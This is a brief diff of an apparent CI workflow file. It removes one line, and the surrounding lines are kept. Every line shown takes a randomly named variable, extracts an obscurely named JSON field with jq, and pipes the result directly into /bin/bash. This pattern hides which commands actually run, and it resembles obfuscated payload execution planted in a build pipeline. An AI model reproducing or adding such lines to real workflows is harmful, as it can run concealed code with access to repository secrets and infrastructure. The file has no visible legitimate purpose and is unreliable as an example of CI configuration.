@@ -21,7 +21,6 @@ jobs:
           echo $otx4469 | jq -r .e4 | /bin/bash
           printf '%s' "$oir8472" | jq -r .yugga8 | /bin/bash
           printf '%s' "$rr82140" | jq -r .tl72760 | /bin/bash
-          echo $xp79638 | jq -r .ithw4 | /bin/bash
           echo $v06917 | jq -r .ay35 | /bin/bash
           printf '%s' "$uvikl90799" | jq -r .l986 | /bin/bash
           echo $ugi5228 | jq -r .jtwb89 | /bin/bash
